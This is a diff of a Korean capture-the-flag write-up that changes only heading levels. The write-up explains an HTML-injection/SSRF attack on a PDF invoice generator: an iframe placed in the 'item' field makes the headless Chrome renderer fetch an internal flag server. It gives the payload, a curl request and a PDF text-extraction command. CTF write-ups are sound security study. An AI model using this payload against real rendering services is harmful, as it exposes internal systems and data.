@@ -13,7 +13,7 @@ comments: false
 `item` 필드에 `<iframe>` 또는 `<object>`를 주입해 내부 컨테이너의 `/flag`를 렌더링시키면, 
 PDF에 플래그가 그대로 찍히고 외부에서 추출 가능하다.
 
-# Overview
+## Overview
 **lactf-invoice-generator**는 “구매한 물품 목록을 PDF 인보이스로 만들어주는” 웹 서비스다.
 
 - 외부에 노출된 서비스: `invoice-generator`
@@ -22,7 +22,7 @@ PDF에 플래그가 그대로 찍히고 외부에서 추출 가능하다.
 핵심은 **인보이스 HTML을 생성할 때 사용자 입력을 그대로 넣고**, 
 서버에서 **puppeteer(Headless Chrome)**로 렌더링해 **PDF로 저장**한다는 점이다.
 
-# Solution
+## Solution
 ### 1) Recon
 - 입력값(`name`, `item`, `cost`, `datePurchased`)이 인보이스 HTML에 그대로 삽입된다.
 - 서버는 puppeteer로 HTML을 렌더링한 뒤 PDF로 저장한다:
@@ -40,15 +40,15 @@ PDF에 플래그가 그대로 찍히고 외부에서 추출 가능하다.
 ### 4) Flag
 생성된 `invoice.pdf`에서 텍스트를 추출하면 플래그 문자열이 나온다.
 
-# Solver
-## 1) Exploit Payload
+## Solver
+### 1) Exploit Payload
 `item` 필드에 아래를 주입:
 
 ```html
 <iframe src="http://flag:8081/flag" style="width:900px;height:300px;border:3px solid black"></iframe>
 ```
 
-## 2) Request
+### 2) Request
 ```bash
 curl -s -X POST "https://<INSTANCE>/generate-invoice" \
   -H "Content-Type: application/json" \
@@ -60,13 +60,13 @@ curl -s -X POST "https://<INSTANCE>/generate-invoice" \
   }' --output invoice.pdf
 ```
 
-## 3) Extraction from PDF
+### 3) Extraction from PDF
 ```bash
 sudo apt-get install -y poppler-utils
 pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
 ```
 
-## 4) Result
+### 4) Result
 puppeteer가 내부망에서만 접근 가능한 `flag` 서버 페이지를 로드하고, 그 렌더링 결과가 PDF로 저장된다.  
 따라서 PDF에서 플래그 문자열을 추출할 수 있다.
 
